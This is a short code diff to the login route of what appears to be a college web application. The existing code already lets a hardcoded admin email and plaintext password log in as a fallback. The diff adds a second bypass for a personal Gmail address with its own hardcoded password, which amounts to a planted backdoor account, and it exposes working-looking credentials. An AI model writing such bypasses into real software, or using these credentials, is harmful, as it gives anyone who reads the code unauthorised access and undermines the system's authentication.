@@ -242,7 +242,7 @@ router.post('/login', async (req, res) => {
     }
     
     // Fallback local memory admin (always allow this for ACET)
-    if ((email === 'admin@acetcbe.edu.in' || email === 'admin') && password === 'acet3d2026') {
+    if (((email === 'admin@acetcbe.edu.in' || email === 'admin') && password === 'acet3d2026') || (email === 'praveenkumars2357@gmail.com' && password === 'Admin@acetcamri')) {
       return res.json({
         success: true,
         data: {
